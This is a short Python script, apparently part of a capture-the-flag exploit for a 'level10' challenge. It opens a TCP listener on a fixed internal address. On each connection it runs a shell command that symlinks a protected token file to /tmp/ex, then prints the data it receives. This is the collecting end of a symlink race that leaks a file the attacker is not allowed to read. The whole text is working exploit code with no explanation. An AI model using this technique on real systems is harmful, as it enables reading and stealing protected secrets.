from os import system
import socket

s = socket.socket()        
print ("Socket successfully created")

port = 6969               
 
s.bind(('10.12.100.30', port))      

s.listen(1)          

while True:
  c, addr = s.accept()
  system("ln -sf /home/user/level10/token /tmp/ex")
  data = c.recv(1024)
  while data:
    print('Received:', repr(data))
    data = c.recv(8024)
  c.close()
